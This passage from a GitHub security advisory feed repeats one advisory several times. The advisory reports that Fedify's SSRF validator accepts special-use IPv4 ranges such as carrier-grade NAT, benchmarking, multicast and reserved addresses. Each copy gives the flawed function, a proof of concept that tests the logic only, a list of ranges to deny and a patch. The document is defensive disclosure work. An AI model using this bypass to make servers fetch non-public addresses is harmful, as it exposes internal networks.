]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/vocab-runtime] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
